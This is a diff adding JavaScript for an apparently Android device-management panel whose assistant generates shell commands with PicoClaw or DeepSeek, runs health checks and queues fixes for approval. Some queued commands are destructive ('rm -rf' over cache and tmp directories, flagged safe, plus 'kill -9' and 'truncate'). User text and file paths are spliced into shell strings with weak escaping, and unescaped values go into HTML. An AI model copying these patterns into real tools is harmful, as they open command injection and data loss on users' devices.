+                    var pcOutput = (pcRes && pcRes.content || '').trim()
+                    if (pcOutput && pcOutput.length > 0 && pcOutput.length < 2000) {
+                        // 清理可能的 markdown 代码块和多余文本
+                        var cleanCmd = pcOutput.replace(/```[a-z]*\n?/gi, '').trim()
+                        // 只取第一行（如果是多行）
+                        var firstLine = cleanCmd.split('\n')[0].trim()
+                        if (firstLine && firstLine.length > 0 && firstLine.length < 500) {
+                            aiLog('🤖 PicoClaw生成命令成功', 'success')
+                            return {
+                                command: firstLine,
+                                description: desc,
+                                reason: 'PicoClaw AI 根据任务描述生成的命令',
+                                category: 'ai_task',
+                                isSafe: false  // AI生成的命令默认需要确认
+                            }
+                        }
+                    }
+                } catch(e) {
+                    // PicoClaw 调用失败，继续尝试其他方式
+                }
+            }
+
+            // 3. 尝试通过shell调用免费AI API（如果curl可用）
+            if (_rs) {
+                try {
+                    var apiPrompt = '你是一个Linux/Android Shell命令生成专家。用户需求：' + desc + '\n请只输出一条Shell命令，不要解释，不要markdown，直接输出命令本身。'
+                    var cmd = "curl -s --max-time 15 -X POST 'https://api.deepseek.com/chat/completions' " +
+                        "-H 'Content-Type: application/json' " +
+                        "-H 'Authorization: Bearer sk-placeholder' " +
+                        "-d '{\"model\":\"deepseek-chat\",\"messages\":[{\"role\":\"user\",\"content\":\"" + apiPrompt.replace(/'/g, "'\\''").replace(/"/g, '\\"') + "\"}],\"temperature\":0.3,\"max_tokens\":500}' 2>/dev/null"
+                    // 上面的API key是占位的，实际大概率失败，所以用try catch
+                    var res = await _rs(cmd)
+                    var text = (res && res.content || '').trim()
+                    if (text && text.indexOf('{') >= 0) {
+                        var jsonStart = text.indexOf('{')
+                        var jsonStr = text.substring(jsonStart)
+                        var data = JSON.parse(jsonStr)
+                        if (data.choices && data.choices[0] && data.choices[0].message) {
+                            var content = data.choices[0].message.content.trim()
+                            // 清理markdown代码块
+                            content = content.replace(/```[a-z]*\n?/gi, '').trim()
+                            if (content) {
+                                aiLog('🤖 AI命令生成成功（API模式）', 'success')
+                                return {
+                                    command: content,
+                                    description: desc,
+                                    reason: 'AI根据任务描述生成的命令',
+                                    category: 'ai_task',
+                                    isSafe: false  // AI生成的命令默认需要确认
+                                }
+                            }
+                        }
+                    }
+                } catch(e) {
+                    // API调用失败，继续用模板
+                }
+            }
+
+            // 4. 兜底：生成一个查看命令
+            var fallbackCmd = 'echo "任务: ' + desc.replace(/"/g, '\\"') + '\n---系统信息---\n$(uname -a)\n---当前目录---\n$(pwd)"'
+            return {
+                command: fallbackCmd,
+                description: 'AI兜底命令：显示系统信息',
+                reason: '未匹配到模板，AI返回兜底命令。建议在描述中使用更明确的关键词，如：清理缓存、查看CPU、重启网络等',
+                category: 'ai_task',
+                isSafe: true
+            }
+        }
+
+        var showTaskResult = function(result) {
+            document.getElementById('ai_task_loading').style.display = 'none'
+            var resultBox = document.getElementById('ai_task_result')
+            var cmdDisplay = document.getElementById('ai_task_cmd_display')
+            if (!result || !result.command) {
+                cmdDisplay.textContent = result && result.reason ? result.reason : '无法生成命令'
+                document.getElementById('ai_task_exec_btn').style.display = 'none'
+            } else {
+                cmdDisplay.textContent = result.command
+                _currentTaskCmd = result
+                document.getElementById('ai_task_exec_btn').style.display = ''
+            }
+            resultBox.style.display = 'block'
+        }
+
+        var executeTaskCmd = async function() {
+            if (!_currentTaskCmd || !_currentTaskCmd.command) return
+            var result = _currentTaskCmd
+
+            // 加入待审批队列，然后立即执行
+            var cmdId = addPendingCommand(result.command, result.description, result.reason, result.category, result.isSafe)
+
+            // 隐藏任务结果框
+            document.getElementById('ai_task_result').style.display = 'none'
+            document.getElementById('ai_task_input').value = ''
+            _currentTaskCmd = null
+
+            // 立即执行（因为用户已经批准了）
+            setTimeout(function() { executeCommand(cmdId) }, 100)
+
+            showToast('命令已批准，正在执行...', 'green', 2000)
+        }
+
+        // ---- 设备巡检 ----
+        var checkStorage = async function() {
+            try {
+                var _rs = getShell(); if (!_rs) return
+                var res = await _rs('df -k /data /sdcard 2>/dev/null | tail -n +2')
+                var lines = (res && res.content || '').trim().split('\n')
+                for (var i = 0; i < lines.length; i++) {
+                    var parts = lines[i].trim().split(/\s+/)
+                    if (parts.length >= 6) {
+                        var total = parseInt(parts[1]) || 0
+                        var used = parseInt(parts[2]) || 0
+                        var avail = parseInt(parts[3]) || 0
+                        var mount = parts[5]
+                        if (total > 0) {
+                            var pct = used / total * 100
+                            if (pct > 90) {
+                                aiLog('存储空间不足: ' + mount + ' 已用 ' + pct.toFixed(1) + '%，剩余 ' + Math.round(avail/1024) + 'MB', 'warn')
+                                addPendingCommand(
+                                    'rm -rf /sdcard/Android/data/*/cache/* /sdcard/Android/cache/* /data/local/tmp/* 2>/dev/null; echo CLEANED',
+                                    '清理缓存和临时文件释放存储空间',
+                                    mount + ' 已用 ' + pct.toFixed(1) + '%，剩余仅 ' + Math.round(avail/1024) + 'MB',
+                                    'storage',
+                                    true
+                                )
+                            } else if (pct > 80) {
+                                aiLog('存储空间偏紧: ' + mount + ' 已用 ' + pct.toFixed(1) + '%', 'info')
+                            }
+                        }
+                    }
+                }
+            } catch(e) { aiLog('存储检查异常: ' + e, 'error') }
+        }
+
+        var checkMemory = async function() {
+            try {
+                var _rs = getShell(); if (!_rs) return
+                var res = await _rs('cat /proc/meminfo 2>/dev/null | head -4')
+                var lines = (res && res.content || '').trim().split('\n')
+                var memTotal = 0, memFree = 0, memAvail = 0, buffers = 0, cached = 0
+                for (var i = 0; i < lines.length; i++) {
+                    var m = lines[i].match(/(\w+):\s+(\d+)/)
+                    if (m) {
+                        if (m[1] === 'MemTotal') memTotal = parseInt(m[2])
+                        else if (m[1] === 'MemFree') memFree = parseInt(m[2])
+                        else if (m[1] === 'MemAvailable') memAvail = parseInt(m[2])
+                        else if (m[1] === 'Buffers') buffers = parseInt(m[2])
+                        else if (m[1] === 'Cached') cached = parseInt(m[2])
+                    }
+                }
+                if (memTotal > 0) {
+                    var usedPct = ((memTotal - memAvail) / memTotal) * 100
+                    if (usedPct > 88 && memAvail < 100000) {
+                        aiLog('内存紧张: 可用 ' + Math.round(memAvail/1024) + 'MB / ' + Math.round(memTotal/1024) + 'MB (' + usedPct.toFixed(0) + '%已用)', 'warn')
+                        addPendingCommand(
+                            'sync; echo 3 > /proc/sys/vm/drop_caches; echo MEMCLEARED',
+                            '释放系统页缓存和dentries（安全操作）',
+                            '可用内存仅 ' + Math.round(memAvail/1024) + 'MB，内存使用率 ' + usedPct.toFixed(0) + '%',
+                            'memory',
+                            true
+                        )
+                    } else if (usedPct > 75) {
+                        aiLog('内存使用偏高: ' + usedPct.toFixed(0) + '%', 'info')
+                    }
+                }
+            } catch(e) { aiLog('内存检查异常: ' + e, 'error') }
+        }
+
+        var checkTemperature = async function() {
+            try {
+                var _rs = getShell(); if (!_rs) return
+                var res = await _rs('cat /sys/class/thermal/thermal_zone*/temp 2>/dev/null | sort -rn | head -1; cat /sys/class/power_supply/battery/temp 2>/dev/null')
+                var lines = (res && res.content || '').trim().split('\n').filter(function(l) { return l.trim() })
+                var maxTemp = 0
+                var batTemp = 0
+                for (var i = 0; i < lines.length; i++) {
+                    var v = parseInt(lines[i].trim())
+                    if (!isNaN(v)) {
+                        if (i === 0) maxTemp = v / 1000
+                        else if (i === 1) batTemp = v / 10
+                    }
+                }
+                if (batTemp > 0 && batTemp > 45) {
+                    aiLog('电池温度过高: ' + batTemp.toFixed(1) + '°C', 'warn')
+                    showToast('⚠️ 电池温度过高(' + batTemp.toFixed(0) + '°C)，建议暂停使用并散热', 'red', 5000)
+                    addPendingCommand(
+                        'echo "TEMP_WARNING:' + batTemp.toFixed(1) + '" > /dev/null; echo DONE',
+                        '记录温度告警（需手动散热，无自动降温命令）',
+                        '电池温度 ' + batTemp.toFixed(1) + '°C 超过安全阈值45°C',
+                        'battery',
+                        true
+                    )
+                }
+                if (maxTemp > 0 && maxTemp > 70) {
+                    aiLog('CPU温度过高: ' + maxTemp.toFixed(1) + '°C', 'warn')
+                    showToast('⚠️ CPU温度过高(' + maxTemp.toFixed(0) + '°C)', 'red', 4000)
+                }
+            } catch(e) {}
+        }
+
+        var checkBattery = async function() {
+            try {
+                var _rs = getShell(); if (!_rs) return
+                var res = await _rs('cat /sys/class/power_supply/battery/capacity 2>/dev/null; cat /sys/class/power_supply/battery/health 2>/dev/null; cat /sys/class/power_supply/battery/status 2>/dev/null')
+                var lines = (res && res.content || '').trim().split('\n').filter(function(l) { return l.trim() })
+                var capacity = parseInt(lines[0]) || -1
+                var health = lines[1] || ''
+                var status = lines[2] || ''
+                if (capacity >= 0 && capacity < 15 && status !== 'Charging') {
+                    aiLog('电量低: ' + capacity + '%，未充电', 'warn')
+                    showToast('⚠️ 电量仅 ' + capacity + '%，请及时充电', 'red', 4000)
+                }
+                if (health && health !== 'Good' && health !== 'Unknown') {
+                    aiLog('电池健康状态异常: ' + health, 'warn')
+                }
+            } catch(e) {}
+        }
+
+        var checkProcesses = async function() {
+            try {
+                var _rs = getShell(); if (!_rs) return
+                var res = await _rs('top -b -n 1 2>/dev/null | head -20 | grep -v "top\\|PID\\|^$"')
+                var lines = (res && res.content || '').trim().split('\n')
+                for (var i = 0; i < lines.length; i++) {
+                    var parts = lines[i].trim().split(/\s+/)
+                    if (parts.length >= 9) {
+                        var cpu = parseFloat(parts[8]) || 0
+                        var pid = parts[0]
+                        var name = parts[parts.length - 1]
+                        if (cpu > 80 && pid && /^\d+$/.test(pid) && name && name.indexOf('kworker') < 0 && name.indexOf('system_server') < 0) {
+                            aiLog('高CPU进程: ' + name + ' (PID:' + pid + ' CPU:' + cpu + '%)', 'warn')
+                            addPendingCommand(
+                                'kill -9 ' + pid + ' 2>/dev/null; echo KILLED_' + pid,
+                                '终止高CPU占用进程: ' + name + ' (PID:' + pid + ')',
+                                '进程 ' + name + ' CPU占用 ' + cpu + '%，可能导致设备卡顿',
+                                'system',
+                                false
+                            )
+                            break // 每次巡检只报告一个
+                        }
+                    }
+                }
+            } catch(e) {}
+        }
+
+        var checkLogFiles = async function() {
+            try {
+                var _rs = getShell(); if (!_rs) return
+                var res = await _rs('find /sdcard -maxdepth 2 -name "*.log" -size +50M -exec ls -l {} \\; 2>/dev/null | head -5')
+                var lines = (res && res.content || '').trim().split('\n').filter(function(l) { return l.trim() })
+                for (var i = 0; i < lines.length; i++) {
+                    var parts = lines[i].trim().split(/\s+/)
+                    if (parts.length >= 8) {
+                        var size = parseInt(parts[3]) || 0
+                        var file = parts[parts.length - 1]
+                        if (size > 50 * 1024 * 1024) { // >50MB
+                            aiLog('日志文件过大: ' + file + ' (' + Math.round(size/1024/1024) + 'MB)', 'warn')
+                            addPendingCommand(
+                                'truncate -s 0 ' + file + ' 2>/dev/null; echo TRUNCATED',
+                                '截断过大日志文件: ' + file,
+                                '日志文件 ' + Math.round(size/1024/1024) + 'MB 过大，占用存储空间',
+                                'storage',
+                                true
+                            )
+                        }
+                    }
+                }
+            } catch(e) {}
+        }
+
+        // ---- 网络监控（只通知建议，不做限速） ----
+        var checkNetwork = async function() {
+            try {
+                var _rs = getShell(); if (!_rs) return
+                var pingMs = -1, lossPct = -1, dnsMs = -1
+                var netOK = false
+
+                // ping 测试（3包，超时5秒）
+                var pingRes = await _rs('ping -c 3 -W 5 8.8.8.8 2>/dev/null | tail -3')
+                var pingText = (pingRes && pingRes.content || '').trim()
+                var lossMatch = pingText.match(/(\d+)% packet loss/)
+                var rttMatch = pingText.match(/rtt[^=]*=\s*([\d.]+)\/([\d.]+)\/([\d.]+)/)
+                if (lossMatch) lossPct = parseInt(lossMatch[1])
+                if (rttMatch) pingMs = parseFloat(rttMatch[2])
+
+                // DNS 解析测试
+                var dnsRes = await _rs('ping -c 1 -W 3 baidu.com 2>/dev/null | tail -2')
+                var dnsText = (dnsRes && dnsRes.content || '').trim()
+                if (dnsText.indexOf('PING') >= 0 || dnsText.indexOf('bytes from') >= 0) {
+                    dnsMs = 1 // DNS正常解析
+                } else {
+                    dnsMs = 0 // DNS解析失败
+                }
+
+                // 判断网络状态
+                var status = '正常'
+                var suggestion = '网络运行良好'
+                var level = 'good'
+
+                if (lossPct >= 0 && lossPct > 30) {
+                    status = '严重丢包'
+                    suggestion = '丢包率 ' + lossPct + '%，建议检查信号强度或重启设备，非限速问题'
+                    level = 'bad'
+                } else if (lossPct >= 0 && lossPct > 10) {
+                    status = '丢包偏高'
+                    suggestion = '丢包率 ' + lossPct + '%，建议靠近路由器或检查天线连接'
+                    level = 'warn'
+                } else if (pingMs >= 0 && pingMs > 300) {
+                    status = '延迟很高'
+                    suggestion = '延迟 ' + pingMs + 'ms，建议重启设备或切换网络（非限速问题）'
+                    level = 'bad'
+                } else if (pingMs >= 0 && pingMs > 150) {
+                    status = '延迟偏高'
+                    suggestion = '延迟 ' + pingMs + 'ms，游戏体验可能受影响'
+                    level = 'warn'
+                } else if (dnsMs === 0) {
+                    status = 'DNS异常'
+                    suggestion = 'DNS解析失败，建议手动设置DNS为 223.5.5.5 或 8.8.8.8'
+                    level = 'warn'
+                } else if (pingMs >= 0) {
+                    status = '正常'
+                    suggestion = '网络稳定，延迟 ' + pingMs + 'ms，丢包 ' + (lossPct >= 0 ? lossPct : 0) + '%'
+                    level = 'good'
+                } else {
+                    status = '网络不通'
+                    suggestion = '无法连接外网，建议检查数据连接或重启设备'
+                    level = 'bad'
+                }
+
+                _netStatus = { ping: pingMs, loss: lossPct, dns: dnsMs, status: status, suggestion: suggestion }
+                _netHistory.push({ time: Date.now(), ping: pingMs, loss: lossPct, dns: dnsMs, status: status })
+                if (_netHistory.length > 30) _netHistory.shift()
+
+                renderNetworkStatus(level)
+
+                // 通知用户（有冷却时间）
+                if (level !== 'good' && Date.now() - _lastNetNotify > _netNotifyCooldown) {
+                    _lastNetNotify = Date.now()
+                    var color = level === 'bad' ? 'red' : 'pink'
+                    showToast('📡 ' + status + ': ' + suggestion, color, 6000)
+                    aiLog('[网络] ' + status + ' — ' + suggestion, 'net')
+                } else if (level === 'good' && Date.now() - _lastNetNotify > _netNotifyCooldown) {
+                    _lastNetNotify = Date.now()
+                    aiLog('[网络] 网络正常 — 延迟 ' + pingMs + 'ms, 丢包 ' + lossPct + '%', 'net')
+                }
+
+                // DNS异常时建议修复命令（设置DNS，非限速）
+                if (dnsMs === 0 && level === 'warn') {
+                    var hasExisting = false
+                    for (var i = 0; i < _pendingCommands.length; i++) {
+                        if (_pendingCommands[i].command.indexOf('setprop net.dns') >= 0 && _pendingCommands[i].status === 'pending') {
+                            hasExisting = true; break
+                        }
+                    }
+                    if (!hasExisting) {
+                        addPendingCommand(
+                            'setprop net.dns1 223.5.5.5; setprop net.dns2 8.8.8.8; echo DNS_SET',
+                            '设置DNS为阿里DNS(223.5.5.5)和GoogleDNS(8.8.8.8)',
+                            '当前DNS解析失败，更换DNS可改善网络连通性（非限速操作）',
+                            'network',
+                            false
+                        )
+                    }
+                }
+            } catch(e) {
+                aiLog('网络检查异常: ' + e, 'error')
+            }
+        }
+
+        // ---- 主巡检循环 ----
+        var runDeviceCheck = async function() {
+            _scanCount++
+            aiLog('===== 第 ' + _scanCount + ' 轮设备巡检开始 =====', 'info')
+            await checkStorage()
+            await checkMemory()
+            await checkTemperature()
+            await checkBattery()
+            await checkProcesses()
+            await checkLogFiles()
+            await checkNetwork()
+            aiLog('===== 第 ' + _scanCount + ' 轮巡检完成，发现 ' + countPending() + ' 个待处理问题 =====', 'success')
+            updateStats()
+            updateFAB()
+        }
+
+        var countPending = function() {
+            var c = 0
+            for (var i = 0; i < _pendingCommands.length; i++) {
+                if (_pendingCommands[i].status === 'pending') c++
+            }
+            return c
+        }
+
+        // ---- 启动/停止 ----
+        var startAI = function() {
+            if (_aiRunning) return
+            _aiRunning = true
+            try { localStorage.setItem('smart_ai_running', '1') } catch(e) {}
+            aiLog('AI助手已启动，开始巡检设备...', 'success')
+            showToast('🤖 AI助手已启动，正在巡检设备', 'green', 3000)
+            // 立即执行一次
+            runDeviceCheck()
+            // 设备巡检每45秒
+            _aiCheckTimer = setInterval(runDeviceCheck, 45000)
+            // 网络监控每30秒
+            _netCheckTimer = setInterval(checkNetwork, 30000)
+            updateRunStatus()
+            updateFAB()
+        }
+
+        var stopAI = function() {
+            if (!_aiRunning) return
+            _aiRunning = false
+            try { localStorage.setItem('smart_ai_running', '0') } catch(e) {}
+            if (_aiCheckTimer) { clearInterval(_aiCheckTimer); _aiCheckTimer = null }
+            if (_netCheckTimer) { clearInterval(_netCheckTimer); _netCheckTimer = null }
+            aiLog('AI助手已停止', 'info')
+            showToast('🤖 AI助手已停止', 'pink', 2000)
+            updateRunStatus()
+            updateFAB()
+        }
+
+        // ---- 渲染函数 ----
+        var renderNetworkStatus = function(level) {
+            var pingEl = document.getElementById('ai_net_ping')
+            var lossEl = document.getElementById('ai_net_loss')
+            var dnsEl = document.getElementById('ai_net_dns')
+            var statusEl = document.getElementById('ai_net_status')
+            var sugEl = document.getElementById('ai_net_suggestion')
+            var badgeEl = document.getElementById('ai_net_badge')
+
+            var cls = '_good'
+            if (level === 'warn') cls = '_warn'
+            else if (level === 'bad') cls = '_bad'
+
+            if (pingEl) {
+                pingEl.textContent = _netStatus.ping >= 0 ? _netStatus.ping + 'ms' : '超时'
+                pingEl.className = 'ai-status-val ' + cls
+            }
+            if (lossEl) {
+                lossEl.textContent = _netStatus.loss >= 0 ? _netStatus.loss + '%' : '-'
+                lossEl.className = 'ai-status-val ' + cls
+            }
+            if (dnsEl) {
+                dnsEl.textContent = _netStatus.dns === 1 ? '正常' : _netStatus.dns === 0 ? '失败' : '-'
+                dnsEl.className = 'ai-status-val ' + (_netStatus.dns === 1 ? '_good' : '_bad')
+            }
+            if (statusEl) {
+                statusEl.textContent = _netStatus.status
+                statusEl.className = 'ai-status-val ' + cls
+            }
+            if (sugEl) sugEl.textContent = _netStatus.suggestion
+            if (badgeEl) {
+                if (level !== 'good') { badgeEl.textContent = '!'; badgeEl.className = 'ai-badge' }
+                else { badgeEl.className = 'ai-badge _0' }
+            }
+        }
+
+        var renderPendingCommands = function() {
+            var container = document.getElementById('ai_pending_container')
+            if (!container) return
+
+            // 只保留待处理的命令（已完成/已拒绝的自动清理，不再显示）
+            var pendingOnly = []
+            for (var i = 0; i < _pendingCommands.length; i++) {
+                if (_pendingCommands[i].status === 'pending') {
+                    pendingOnly.push(_pendingCommands[i])
+                }
+            }
+            _pendingCommands = pendingOnly
+
+            if (!_pendingCommands.length) {
+                container.innerHTML = '<div class="ai-empty">暂无待执行命令，AI巡检发现问题后会在此建议</div>'
+                var execAllBtn = document.getElementById('ai_approve_all_btn')
+                if (execAllBtn) execAllBtn.style.display = 'none'
+                var badge = document.getElementById('ai_pending_badge')
+                if (badge) { badge.className = 'ai-badge _0'; badge.textContent = '0' }
+                return
+            }
+
+            var html = ''
+            var pendingCount = 0
+            // 倒序显示（最新的在最上面）
+            for (var i = _pendingCommands.length - 1; i >= 0; i--) {
+                var cmd = _pendingCommands[i]
+                if (cmd.status === 'pending') pendingCount++
+                var cls = 'ai-cmd-item _' + cmd.status
+                var catCls = 'ai-cmd-cat _' + cmd.category
+                var actionsHtml = ''
+                if (cmd.status === 'pending') {
+                    actionsHtml = '<div class="ai-cmd-actions">' +
+                        '<button class="ai-btn ai-btn-approve" data-action="exec" data-cmd-id="' + cmd.id + '">✅ 批准执行</button>' +
+                        '<button class="ai-btn ai-btn-reject" data-action="reject" data-cmd-id="' + cmd.id + '">❌ 拒绝</button>' +
+                        '</div>'
+                }
+                var resultHtml = ''
+                if (cmd.result) {
+                    resultHtml = '<div class="ai-cmd-result' + (cmd.status === 'failed' ? ' _err' : '') + '">' + (cmd.status === 'done' ? '✅ ' : cmd.status === 'failed' ? '❌ ' : '') + cmd.result + '</div>'
+                }
+                var safeTag = cmd.isSafe ? '<span style="font-size:9px;color:#4ade80;margin-left:4px">[安全]</span>' : '<span style="font-size:9px;color:#f87171;margin-left:4px">[需确认]</span>'
+                html += '<div class="' + cls + '">' +
+                    '<div class="ai-cmd-reason"><span class="' + catCls + '">' + cmd.category + '</span>' + cmd.reason + safeTag + '</div>' +
+                    '<div class="ai-cmd-text">$ ' + cmd.command + '</div>' +
+                    actionsHtml + resultHtml +
+                    '</div>'
+            }
+            container.innerHTML = html
+
+            var execAllBtn = document.getElementById('ai_approve_all_btn')
+            if (execAllBtn) execAllBtn.style.display = pendingCount > 0 ? 'block' : 'none'
+
+            var badge = document.getElementById('ai_pending_badge')
+            if (badge) {
+                badge.textContent = pendingCount
+                badge.className = pendingCount > 0 ? 'ai-badge' : 'ai-badge _0'
+            }
+        }
+
+        var renderAILogs = function() {
+            var area = document.getElementById('ai_log_area')
+            if (!area) return
+            if (!_aiLogs.length) {
+                area.innerHTML = '<div class="ai-empty">AI未启动</div>'
+                return
+            }
+            var html = ''
+            for (var i = 0; i < _aiLogs.length; i++) {
+                var log = _aiLogs[i]
+                var color = log.level === 'warn' ? '#fbbf24' : log.level === 'error' ? '#f87171' : log.level === 'success' ? '#4ade80' : log.level === 'net' ? '#34d399' : 'rgba(255,255,255,.6)'
+                html += '<div class="ai-log-line"><span class="ai-log-time">' + log.time + '</span>' + log.icon + ' <span style="color:' + color + '">' + log.text + '</span></div>'
+            }
+            area.innerHTML = html
+        }
+
+        var updateStats = function() {
+            var sc = document.getElementById('ai_scan_count')
+            if (sc) sc.textContent = _scanCount
+            var ic = document.getElementById('ai_issues_count')
+            if (ic) ic.textContent = _issuesFound
+            var ec = document.getElementById('ai_exec_count')
+            if (ec) {
+                var count = 0
+                for (var i = 0; i < _pendingCommands.length; i++) {
+                    if (_pendingCommands[i].status === 'done') count++
+                }
+                ec.textContent = count
+            }
+        }
+
+        var updateRunStatus = function() {
+            var el = document.getElementById('ai_run_status')
+            if (!el) return
+            if (_aiRunning) {
+                el.textContent = '运行中'
+                el.className = 'ai-status-val _good'
+            } else {
+                el.textContent = '未启动'
+                el.className = 'ai-status-val _bad'
+            }
+            var startBtn = document.getElementById('ai_start_btn')
+            if (startBtn) {
+                if (_aiRunning) {
+                    startBtn.textContent = '⏹ 停止巡检'
+                    startBtn.className = 'ai-btn ai-btn-stop'
+                } else {
+                    startBtn.textContent = '▶ 启动巡检'
+                    startBtn.className = 'ai-btn ai-btn-start'
+                }
+            }
+        }
+
+        var updateFAB = function() {
+            var pending = countPending()
+            if (_aiRunning || pending > 0) {
+                fab.classList.add('_show')
+                if (pending > 0) {
+                    fab.classList.add('_haspending')
+                    fab.classList.remove('_running')
+                } else if (_aiRunning) {
+                    fab.classList.add('_running')
+                    fab.classList.remove('_haspending')
+                }
+                var badge = document.getElementById('ai_fab_badge')
+                if (badge) {
+                    if (pending > 0) { badge.textContent = pending; badge.className = 'fab-badge' }
+                    else { badge.className = 'fab-badge _0' }
+                }
+            } else {
+                fab.classList.remove('_show', '_running', '_haspending')
+            }
+        }
+
+        // ---- 面板切换 ----
+        window.toggleAIPanel = function() {
+            if (_panelVisible) hidePanel(); else showPanel()
+        }
+
+        var showPanel = function() {
+            _panelVisible = true
+            panel.classList.add('_show')
+            overlay.classList.add('_show')
+            renderPendingCommands()
+            renderAILogs()
+            updateStats()
+            updateRunStatus()
+        }
+
+        var hidePanel = function() {
+            _panelVisible = false
+            panel.classList.remove('_show')
+            overlay.classList.remove('_show')
+        }
+
+        // ---- 全局回调 ----
+        window.__aiExec = function(id) { executeCommand(id) }
+        window.__aiReject = function(id) { rejectCommand(id) }
+
+        // ---- 事件绑定 ----
+        document.getElementById('ai_close_btn').onclick = hidePanel
+        overlay.onclick = hidePanel
+
+        document.getElementById('ai_start_btn').onclick = function() {
+            if (_aiRunning) stopAI(); else startAI()
+        }
+
+        document.getElementById('ai_scan_now_btn').onclick = function() {
+            showToast('🤖 正在执行立即检查...', 'pink', 2000)
+            runDeviceCheck()
+        }
+
+        // AI 深度诊断（PicoClaw 驱动，失败时自动降级为本地诊断）
+        document.getElementById('ai_deep_diag_btn').onclick = async function() {
+            if (!_picoclawInstalled || !_picoclawConfigured) {
+                if (!_picoclawInstalled) {
+                    showToast('请先安装 PicoClaw 小龙虾', 'red', 2500)
+                } else {
+                    showToast('请先配置 PicoClaw API Key', 'red', 2500)
+                }
+                // 切到 PicoClaw 聊天 tab
+                switchAITab('chat')
+                return
+            }
+
+            var btn = document.getElementById('ai_deep_diag_btn')
+            var originalText = btn.textContent
+            btn.disabled = true
+            btn.textContent = '🔍 正在收集信息...'
+            aiLog('🦞 PicoClaw 深度诊断开始...', 'info')
+
+            try {
+                var _rs = getShell()
+                // 1. 收集系统信息（更全面）
+                var diagData = {}
+                if (_rs) {
+                    try {
+                        var sysCmd = 'echo "=== 系统信息 ===" && ' +
+                            'uname -a && echo "" && ' +
+                            'echo "=== 内核版本 ===" && cat /proc/version 2>/dev/null && echo "" && ' +
+                            'echo "=== CPU ===" && cat /proc/cpuinfo 2>/dev/null | grep "model name" | head -1 && echo "" && ' +
+                            'echo "=== 内存 ===" && cat /proc/meminfo 2>/dev/null | head -5 && echo "" && ' +
+                            'echo "=== 温度 ===" && cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null && echo "" && ' +
+                            'echo "=== 存储 ===" && df -h / /data 2>/dev/null && echo "" && ' +
+                            'echo "=== 网络 ===" && ip addr show 2>/dev/null | grep "inet " && echo "" && ' +
+                            'echo "=== 进程TOP ===" && top -bn1 2>/dev/null | head -10 && echo "" && ' +
+                            'echo "=== 开机时长 ===" && cat /proc/uptime 2>/dev/null'
+                        var sysRes = await _rs(sysCmd, 8000)
+                        diagData.system = sysRes.content || ''
+                    } catch(e) { diagData.system = '获取失败: ' + String(e) }
+                }
+
+                // 2. 先显示本地收集的信息（确保有东西看）
+                aiLog('--- 系统信息（已收集） ---', 'info')
+                var sysLines = (diagData.system || '').split('\n')
+                for (var sli = 0; sli < Math.min(sysLines.length, 30); sli++) {
+                    if (sysLines[sli].trim()) aiLog(sysLines[sli], 'info')
+                }
+                aiLog('--- 信息收集完成 ---', 'info')
+
+                // 3. 尝试用 AI 分析
+                btn.textContent = '🤖 AI 分析中...'
+                aiLog('📤 正在发送给 PicoClaw 分析...', 'info')
+                
+                var prompt = '你是一个专业的 Android/CPE 设备诊断专家。请根据以下系统信息进行深度分析，找出潜在问题并给出修复建议。\n\n'
+                prompt += '## 系统信息\n```\n' + (diagData.system || '无法获取') + '\n```\n\n'
+                prompt += '请按以下格式回答：\n'
+                prompt += '## 诊断结论\n（总体评估）\n\n'
+                prompt += '## 发现的问题\n1. 问题1 - 严重程度：高/中/低\n2. 问题2...\n\n'
+                prompt += '## 修复建议\n（给出具体的 Shell 命令或操作步骤）\n\n'
+                prompt += '请用中文回答，简洁明了。'
+                
+                var result = await sendToPicoClaw(prompt)
+                if (result.success && result.content) {
+                    aiLog('✅ AI 诊断完成', 'success')
+                    // 显示结果
+                    addPendingCommand(
+                        'echo "PicoClaw 深度诊断报告已生成，查看 AI 日志"',
+                        'AI 深度诊断报告',
+                        result.content.substring(0, 200),
+                        'ai_diagnosis',
+                        true
+                    )
+                    // 同时在日志里显示完整结果
+                    aiLog('--- 🤖 AI 诊断报告 ---', 'success')
+                    var lines = result.content.split('\n')
+                    for (var li = 0; li < lines.length; li++) {
+                        if (lines[li].trim()) aiLog(lines[li], 'info')
+                    }
+                    aiLog('--- 报告结束 ---', 'success')
+                    showToast('✅ 深度诊断完成，查看 AI 日志', 'green', 3000)
+                    // 切到 AI 日志区域
+                    var logArea = document.getElementById('ai_log_area')
+                    if (logArea) logArea.scrollTop = logArea.scrollHeight
+                } else {
+                    // AI 分析失败，但系统信息已经收集了
+                    var errMsg = result.error || '未知错误'
+                    aiLog('⚠️ AI 分析失败: ' + errMsg, 'warn')
+                    aiLog('💡 但系统信息已收集完成，可手动查看上方日志', 'info')
+                    
+                    // 如果是余额不足，给出充值和免费方案建议
+                    if (errMsg.indexOf('余额不足') >= 0 || errMsg.indexOf('insufficient') >= 0) {
+                        aiLog('💡 推荐免费方案：硅基流动(SiliconFlow)每日有免费额度', 'info')
+                        aiLog('   注册地址: https://cloud.siliconflow.cn', 'info')
+                    }
+                    
+                    showToast('AI 分析失败，系统信息已记录在日志', 'yellow', 4000)
+                    
+                    // 添加到待审批（方便查看）
+                    addPendingCommand(
+                        'echo "查看 AI 日志中的系统信息"',
+                        '系统诊断报告（本地模式）',
+                        'AI 分析失败，但系统信息已收集，查看 AI 日志',
+                        'ai_diagnosis_local',
+                        true
+                    )
+                }
+            } catch(e) {
+                aiLog('❌ 诊断异常：' + String(e), 'error')
+                showToast('诊断异常', 'red', 2000)
+            } finally {
+                btn.disabled = false
+                btn.textContent = originalText
+            }
+        }
+
+        document.getElementById('ai_approve_all_btn').onclick = approveAllPending
+
+        // AI代码任务按钮
+        document.getElementById('ai_gen_btn').onclick = async function() {
+            var input = document.getElementById('ai_task_input')
+            var desc = (input && input.value || '').trim()
+            if (!desc) { showToast('请输入任务描述', 'red'); return }
+
+            document.getElementById('ai_task_loading').style.display = 'block'
+            document.getElementById('ai_task_result').style.display = 'none'
+
+            try {
+                var result = await generateCommand(desc)
+                showTaskResult(result)
+            } catch(e) {
+                document.getElementById('ai_task_loading').style.display = 'none'
+                showToast('生成失败: ' + (e.message || e), 'red', 3000)
+            }
+        }
+        document.getElementById('ai_task_input').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') document.getElementById('ai_gen_btn').click()
+        })
+        document.getElementById('ai_task_exec_btn').onclick = executeTaskCmd
+        document.getElementById('ai_task_cancel_btn').onclick = function() {
+            document.getElementById('ai_task_result').style.display = 'none'
+            _currentTaskCmd = null
+        }
+
+        // 待审批命令的事件委托（替代内联onclick，兼容性更好）
